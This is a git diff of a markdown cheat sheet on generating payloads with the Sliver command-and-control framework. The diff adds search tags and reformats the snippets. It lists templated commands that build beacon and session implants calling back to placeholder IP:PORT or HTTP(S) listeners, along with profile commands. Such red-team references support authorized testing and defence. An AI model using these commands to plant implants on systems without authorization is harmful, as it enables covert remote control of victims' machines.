@@ -1,5 +1,7 @@
 # 04 - Generate Payloads
 
+Search Tag(s): #sliver #command-and-control
+
 ## 4.1 - Beacons
 
 ### 4.1.1 - Help Menu
@@ -61,11 +63,13 @@ Flags:
 
 * Generate beacons
 
-`sliver > generate beacon -a <architecture> -l -S <seconds> -m <IP>:<PORT> -o <platform> -f <format> -s /path/to/folder`
+```
+sliver > generate beacon -a <architecture> -l -S <seconds> -m <IP>:<PORT> -o <platform> -f <format> -s /path/to/folder
 
-`sliver > generate beacon -a <architecture> -l -S <seconds> -m <IP>:<PORT> -o <platform> -f <format> -s /path/to/folder`
+sliver > generate beacon -a <architecture> -l -S <seconds> -m <IP>:<PORT> -o <platform> -f <format> -s /path/to/folder
 
-`sliver > generate beacon -a <architecture> -l -S <seconds> -b http[s]://<IP>:<PORT> -o <platform> -f <format> -s /path/to/folder`
+sliver > generate beacon -a <architecture> -l -S <seconds> -b http[s]://<IP>:<PORT> -o <platform> -f <format> -s /path/to/folder
+```
 
 #### 4.1.2.2 - Windows
 
@@ -181,9 +185,11 @@ Flags:
 
 * Syntax
 
-`sliver > profiles new beacon -m <IP>:<PORT> -S 5 -J 10 -l -a <architecture> -o <platform> -f <format> <profile_name>`
+```
+sliver > profiles new beacon -m <IP>:<PORT> -S 5 -J 10 -l -a <architecture> -o <platform> -f <format> <profile_name>
 
-`sliver > profiles generate <profile>`
+sliver > profiles generate <profile>
+```
 
 ## 4.2 - Sessions
 
@@ -246,9 +252,11 @@ Sub Commands:
 
 This beacon will be on interactive (session) mode
 
-`sliver > generate -m <IP>:<PORT> -a <architecture> -o <platform> -f <format> -s /path/to/directory`
+```
+sliver > generate -m <IP>:<PORT> -a <architecture> -o <platform> -f <format> -s /path/to/directory
 
-`sliver > generate -b http[s]://<IP>:<PORT> -a <architecture> -o <platform> -f <format> -s /path/to/folder`
+sliver > generate -b http[s]://<IP>:<PORT> -a <architecture> -o <platform> -f <format> -s /path/to/folder
+```
 
 ### 4.2.3 - Profiles
 
